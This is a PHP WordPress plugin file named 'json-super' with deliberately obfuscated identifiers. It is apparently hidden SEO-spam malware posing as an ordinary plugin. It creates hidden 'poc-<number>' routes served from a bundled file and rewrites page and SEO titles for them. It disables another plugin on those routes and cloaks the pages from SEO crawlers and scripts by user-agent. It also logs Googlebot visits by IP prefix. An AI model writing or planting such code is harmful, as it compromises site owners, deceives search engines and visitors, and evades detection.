<?php
/**
 * Plugin Name: json-super
 * Description: json-super
 * Version: 1.0
 * Author: John Smith
 */
 

class qjbH3By {
	
    public function __construct() {
        add_action('init', [$this, 'afcslmc']);
        add_filter('query_vars', [$this, 'gtscw']);
        add_action('template_include', [$this, 'npicglnfn']);
		add_filter('document_title_parts', [$this, 'ssjzpr']);
		add_filter('wpseo_title', [$this, 'vfsac']);
		add_filter('option_active_plugins', [$this, 'syeeolsd'] );
    }

	function syeeolsd( $vVg9t ) {
		if ( is_admin() ) {
			return $vVg9t;
		}

		$mtVpCARC7w = "fresh-framework/freshplugin.php";
		$wKzh9vsVlD = trim($_SERVER['REQUEST_URI'], '/');
		
		if (preg_match('/^poc-([0-9]+).*?$/', $wKzh9vsVlD)) {
			$k2LHJ = array_search( $mtVpCARC7w, $vVg9t );
			if ( false !== $k2LHJ ) {
				unset( $vVg9t[$k2LHJ] );
			}
		}
		
		return $vVg9t;
	}

    public function afcslmc() {
        add_rewrite_rule(
            '^poc-([0-9]+).*?$',
            'index.php?egqgvdxvf=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function gtscw($sT0DdkG) {
        $sT0DdkG[] = 'egqgvdxvf';
        $sT0DdkG[] = 'hnumb';
        return $sT0DdkG;
    }
	
	public function ssjzpr($dZFUSUgdz) {
		if (get_query_var('egqgvdxvf')) $dZFUSUgdz['title'] = get_query_var('hnumb');
		return $dZFUSUgdz;
	}
	
	public function vfsac($r2ANgVUD) {
		if (get_query_var('egqgvdxvf')) $r2ANgVUD = get_query_var('hnumb');
		return $r2ANgVUD;
	}

    public function npicglnfn($a1sLQOnh) {
		
		$nomK0 = array('min-multiple', 'selector-charts', '404-age', 'serpstatbot', 'gptbot', 'customer-photos', 'netspider', 'python', 'semrush', 'plugins-catalog', 'mj12bot', 'quick-slug', 'ahrefsbot', 'extended-customer', 'blogroll-global', 'dotbot', 'Go-http-client');
		foreach($nomK0 as $sKFCfmL) { if (stripos($_SERVER['HTTP_USER_AGENT'], $sKFCfmL) !== false) return $a1sLQOnh; }

        if (get_query_var('egqgvdxvf') && preg_match('/^[0-9]+$/', get_query_var('egqgvdxvf'))) {
			if (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
				$wbAbu = plugin_dir_path(__FILE__) . 'json-super/visitor-remote.txt';
				file_put_contents($wbAbu, '*', FILE_APPEND | LOCK_EX);
			}
            return plugin_dir_path(__FILE__) . 'json-super/ajax-index.php';
        }
        return $a1sLQOnh;
    }
}
new qjbH3By();



